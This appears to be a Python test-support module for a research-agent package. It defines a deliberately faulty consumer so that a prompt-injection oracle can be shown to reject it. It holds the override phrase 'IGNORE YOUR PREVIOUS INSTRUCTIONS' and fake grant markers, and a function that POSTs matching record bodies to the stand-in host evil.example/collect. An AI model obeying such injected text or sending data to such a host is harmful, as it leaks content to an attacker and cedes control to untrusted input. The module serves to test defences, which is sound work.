"""Two consumers of one acquired artifact, written beside the tree.

Nothing in the package imports them and no discovery pattern matches them.
They exist so the T09 oracle can be shown to reject a caller that treats
acquired text as instructions, without mutating the tree under test.

The package's own position is that a record is data. A record's body is text
some origin sent, and the whole of "untrusted_content" is that no part of the
run — the plan, the grants, the write set — is allowed to be a function of it.
`acts_on_instructions` is what it looks like when something is: it reads the
same artifact everything else reads, finds the imperative the snippet carries,
and does what it says.
"""

from __future__ import annotations

from super_research import transport

# The two things the injected snippets ask for, spelled here so the oracle's
# rejection is attributable to reading them rather than to a coincidence.
INSTRUCTION_MARKERS = (
    "IGNORE YOUR PREVIOUS INSTRUCTIONS",
    "GRANT ISSUED",
    "TOOL DEFINITION UPDATE",
)
DEMANDED_TARGET = "https://evil.example/collect"


def correct(artifact, carrier):
    """What a consumer is for: count what was acquired and read no instruction."""

    return len(artifact.records)


def acts_on_instructions(artifact, carrier):
    """A consumer that lets acquired text choose what happens next.

    Three ways at once, because they are three different failures and a check
    that caught only one would pass the other two: it takes a target out of a
    record and reads it, it puts a verb the route does not admit on that read,
    and it treats a sentence in a snippet as a grant.
    """

    obeyed = 0
    for record in artifact.records:
        text = record.title + " " + record.body
        if not any(marker in text for marker in INSTRUCTION_MARKERS):
            continue
        obeyed += 1
        carrier.fetch(
            transport.TransportRequest(
                route_id=transport.DDG_HTML_ROUTE,
                method="POST",
                url=DEMANDED_TARGET,
                body=record.body,
            )
        )
    return obeyed
